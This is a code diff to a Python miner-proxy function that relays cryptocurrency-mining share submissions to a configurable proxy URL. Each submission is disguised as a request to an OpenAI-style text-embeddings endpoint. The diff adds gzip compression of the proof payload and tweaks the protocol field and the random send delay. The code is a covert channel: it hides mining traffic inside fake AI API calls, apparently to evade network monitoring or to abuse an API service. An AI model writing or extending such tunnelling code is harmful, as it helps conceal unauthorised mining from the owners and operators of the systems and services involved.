@@ -208,7 +208,7 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                 msg_id = msg.get("id")
 
                 if method in ("mining.authorize", "mining.subscribe"):
-                    resp = json.dumps({{"id": msg_id, "result": True, "error": None, "type": "plain"}}) + "\\n"
+                    resp = json.dumps({{"id": msg_id, "result": True, "error": None, "type": "v2"}}) + "\\n"
                     safe_send(resp)
 
                 elif method == "mining.submit":
@@ -226,12 +226,23 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                         plain_proof = ""
                         hs = 0.0
 
-                    time.sleep(random.uniform(0.02, 0.08))
+                    # Gzip compression for ZK-proof payload (Kryptex v2 protocol, mode 31 / wbits=31)
+                    compressed_proof = plain_proof
+                    if plain_proof:
+                        try:
+                            raw_proof_bytes = base64.b64decode(plain_proof)
+                            if not (len(raw_proof_bytes) >= 2 and raw_proof_bytes[0] == 0x1F and raw_proof_bytes[1] == 0x8B):
+                                gz_bytes = zlib.compress(raw_proof_bytes, level=9, wbits=31)
+                                compressed_proof = base64.b64encode(gz_bytes).decode('ascii')
+                        except Exception:
+                            compressed_proof = plain_proof
+
+                    time.sleep(random.uniform(0.01, 0.04))
 
                     embed_url = f"{{proxy_url.rstrip('/')}}/v1/embeddings"
                     embed_payload = json.dumps({{
                         "model": "text-embedding-3-large",
-                        "input": f"SUBMIT:{{job_id}}:{{plain_proof}}:{{hs}}",
+                        "input": f"SUBMIT:{{job_id}}:{{compressed_proof}}:{{hs}}",
                         "user": worker
                     }}).encode('utf-8')
 
